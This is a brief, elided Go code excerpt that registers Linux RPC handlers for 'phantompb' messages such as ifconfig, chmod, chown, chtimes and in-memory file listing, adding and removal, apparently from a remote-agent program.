...
var (
	linuxHandlers = map[uint32]RPCHandler{
		...
		phantompb.MsgIfconfigReq:        ifconfigLinuxHandler,
		...
		// Linux Only
		phantompb.MsgChmodReq:   chmodHandler,
		phantompb.MsgChownReq:   chownHandler,
		phantompb.MsgChtimesReq: chtimesHandler,

		phantompb.MsgMemfilesListReq: memfilesListHandler,
		phantompb.MsgMemfilesAddReq:  memfilesAddHandler,
		phantompb.MsgMemfilesRmReq:   memfilesRmHandler,
	}
)
...
func memfilesRmHandler(data []byte, resp RPCResponse) {
	...
	memfilesRmReq := &phantompb.MemfilesRmReq{}
